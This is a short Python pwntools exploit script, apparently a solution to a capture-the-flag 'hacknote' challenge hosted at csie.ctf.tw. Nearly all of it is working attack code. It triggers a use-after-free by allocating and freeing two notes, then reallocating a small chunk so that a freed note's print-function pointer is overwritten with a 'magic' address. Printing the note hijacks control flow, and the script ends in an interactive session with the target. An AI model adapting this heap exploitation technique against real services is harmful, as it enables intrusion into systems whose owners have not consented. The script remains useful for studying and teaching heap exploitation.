#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10137)
magic = 0x400c23 


def add_note(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)

def del_note(index):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(index))


def print_note(index):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(index))


add_note(0x50, "data")
add_note(0x50, "data")

del_note(0)
del_note(1)

add_note(0x10, p64(magic))

print_note(0)

r.interactive()
